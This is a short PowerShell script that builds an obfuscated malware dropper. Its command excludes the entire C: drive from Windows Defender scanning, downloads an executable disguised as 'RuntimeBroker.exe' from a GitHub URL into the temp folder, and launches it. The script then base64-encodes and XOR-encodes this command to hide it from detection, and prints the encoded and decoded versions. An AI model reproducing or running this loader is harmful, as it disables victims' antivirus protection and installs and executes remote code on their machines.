$command = 'Add-MpPreference -ExclusionPath C:\; $url="https://github.com/zessu/cybersec/raw/refs/heads/master/RuntimeBroker.exe"; $output="$env:Temp\RuntimeBroker.exe"; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output'

# Base64 encode the original command
$base64Encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))

# XOR the Base64 string
$xorKey = 101
$xorBytes = [System.Text.Encoding]::UTF8.GetBytes($base64Encoded) | ForEach-Object { $_ -bxor $xorKey }
$xorBase64 = [Convert]::ToBase64String($xorBytes)

Write-Host "XOR-Encoded Base64:" -ForegroundColor Cyan
Write-Host $xorBase64

# Decoding process
$deXorBytes = [Convert]::FromBase64String($xorBase64) | ForEach-Object { $_ -bxor $xorKey }
$deXorBase64 = [System.Text.Encoding]::UTF8.GetString($deXorBytes)
$decodedCommand = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($deXorBase64))

Write-Host "Decoded Command:" -ForegroundColor Yellow
Write-Host $decodedCommand